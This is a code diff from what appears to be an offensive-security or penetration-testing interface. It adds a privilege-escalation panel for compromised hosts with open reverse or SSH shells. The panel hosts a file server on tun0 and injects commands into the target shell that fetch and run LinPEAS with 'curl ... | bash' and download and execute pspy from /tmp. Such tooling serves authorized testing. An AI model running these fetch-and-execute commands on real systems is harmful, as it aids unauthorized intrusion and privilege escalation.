@@ -4,6 +4,7 @@ import { api } from "../../api";
 import { DetachableTerminal } from "../../FloatingTerminal";
 import SmartTerminalOutput from "../../SmartTerminalOutput";
 import InteractiveTerminal from "../../InteractiveTerminal";
+import LinpeasAnalysisPanel from "../../LinpeasAnalysisPanel";
 import XtermOutput from "../../XtermOutput";
 import { parseLinkExtractResults, parseMysqlProbeSuccess } from "../../serviceIntel";
 import { buildFileTree, FileTreeView, parseTaggedTreeLines } from "../../fileTree";
@@ -59,6 +60,7 @@ export function Inspector(props: {
   executionContext?: { targetId: number; serviceId?: number } | null;
   onOpenRequest?: (draft: GraphRequestDraft) => void;
   onOpenHashCrack?: (handoff: CredentialHandoff) => void;
+  onOpenFileTree?: (targetId: number) => void;
   onToggleHidden: (id: string, hidden: boolean) => void;
   onSetStatus: (id: string, status: string) => void;
   onSetDetails?: (id: string, details: { notes?: string; pinned?: boolean; label?: string }) => void;
@@ -210,6 +212,45 @@ export function Inspector(props: {
   >(null);
   const [openFilePath, setOpenFilePath] = useState<string | null>(null);
   const [retryError, setRetryError] = useState("");
+  // Any shell opened via App.tsx's openManualShell/openListenerShell/openSshShell
+  // (reverse shells, SSH, psexec, ...) always rides through the generic manual
+  // endpoint and gets template_id="manual-shell", regardless of what command
+  // actually spawned it -- so this is the one tool value that reliably means
+  // "there's a real interactive shell behind this node", the same premise
+  // PrivescSessionPanel already builds on for its own dedicated session.
+  const isManualShell = tool === "manual-shell";
+  const [manualShellOpen, setManualShellOpen] = useState(false);
+  const [manualShellInputRequest, setManualShellInputRequest] =
+    useState<{id: number; data: string}>();
+  const [privescServer, setPrivescServer] = useState<{
+    running: boolean; port?: number; base_url?: string;
+    available?: {peass?: boolean; pspy?: boolean};
+  }>();
+  const [privescServerBusy, setPrivescServerBusy] = useState(false);
+  const privescServerStatus = useQuery({
+    queryKey: ["privescServerStatus"],
+    enabled: sessionId !== null && isManualShell,
+    queryFn: () => api<typeof privescServer>("/privesc-server/status"),
+  });
+  useEffect(() => {
+    if (privescServerStatus.data) setPrivescServer(privescServerStatus.data);
+  }, [privescServerStatus.data]);
+  const togglePrivescServer = async () => {
+    setPrivescServerBusy(true);
+    try {
+      setPrivescServer(await api<typeof privescServer>(
+        `/privesc-server/${privescServer?.running ? "stop" : "start"}`, {method: "POST"}));
+    } finally {
+      setPrivescServerBusy(false);
+    }
+  };
+  // The socket only flushes an inputRequest once it's actually connected
+  // (see PtyTerminal), so this only makes sense once the operator has
+  // opened the terminal themselves and given it a moment to connect --
+  // same precondition PrivescSessionPanel's own send button relies on.
+  const sendToManualShell = (command: string) => {
+    setManualShellInputRequest({id: Date.now(), data: command});
+  };
   const sessionQuery = useQuery({
     queryKey: ["graphInteractiveSession", sessionId],
     enabled: sessionId !== null,
@@ -1180,6 +1221,48 @@ export function Inspector(props: {
       {manualSession && <InteractiveTerminal sessionId={manualSession.id}
         title={manualSession.title} initialInput={manualSession.initialInput} autoFloat
         onClose={() => setManualSession(null)} />}
+      {sessionId !== null && isManualShell && <section className="privescServer"
+        aria-labelledby="graph-privesc-server-heading">
+        <header>
+          <h2 id="graph-privesc-server-heading">권한 상승 스크립트 서버 (LinPEAS/pspy)</h2>
+          <small>{privescServer?.running
+            ? `tun0에서 서비스 중 · ${privescServer.base_url}`
+            : "대상이 접근할 수 있도록 tun0에만 임시 파일서버를 엽니다."}</small>
+        </header>
+        <div className="privescServerActions">
+          <button type="button" disabled={manualShellOpen}
+            onClick={() => setManualShellOpen(true)}>
+            세션 열기
+          </button>
+          {props.onOpenFileTree && props.executionContext && <button type="button"
+            onClick={() => props.onOpenFileTree!(props.executionContext!.targetId)}>
+            폴더·파일 트리 보기
+          </button>}
+          <button type="button" disabled={privescServerBusy}
+            onClick={() => void togglePrivescServer()}>
+            {privescServerBusy ? "처리 중…" : privescServer?.running ? "서버 중지" : "서버 시작"}
+          </button>
+          <button type="button" disabled={!manualShellOpen || !privescServer?.running
+            || !(privescServer?.available?.peass ?? true)}
+            onClick={() => sendToManualShell(
+              `curl -sS ${privescServer?.base_url}/peass/linpeas/linpeas.sh | bash`)}>
+            LinPEAS 명령 셸에 입력
+          </button>
+          <button type="button" disabled={!manualShellOpen || !privescServer?.running
+            || !(privescServer?.available?.pspy ?? true)}
+            onClick={() => sendToManualShell(
+              `curl -sS ${privescServer?.base_url}/pspy/pspy64 -o /tmp/pspy64 ` +
+              `&& chmod +x /tmp/pspy64 && /tmp/pspy64`)}>
+            pspy 명령 셸에 입력
+          </button>
+        </div>
+      </section>}
+      {sessionId !== null && isManualShell && manualShellOpen && <InteractiveTerminal
+        sessionId={sessionId} title={n?.label || "세션"}
+        inputRequest={manualShellInputRequest} autoFloat
+        onClose={() => setManualShellOpen(false)} />}
+      {sessionId !== null && isManualShell && <LinpeasAnalysisPanel
+        targetId={props.executionContext?.targetId} projectId={props.projectId} />}
       {executionId !== null && <DetachableTerminal id={`graph-execution-${executionId}`}
         label={`${n.label} 실행 결과`}
         commandContext={target && props.executionContext ? {
